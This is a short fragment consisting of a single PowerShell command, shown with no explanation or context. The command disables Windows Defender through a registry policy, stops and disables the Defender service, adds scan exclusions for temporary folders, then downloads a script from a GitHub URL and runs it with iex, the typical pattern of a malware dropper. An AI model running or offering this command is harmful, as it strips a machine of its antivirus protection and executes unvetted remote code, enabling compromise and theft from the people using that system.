...
powershell -c "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled; Set-MpPreference -ExclusionPath C:\Windows\Temp; Set-MpPreference -ExclusionPath $env:TEMP; $script = (New-Object Net.WebClient).DownloadString('https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1'); iex $script"
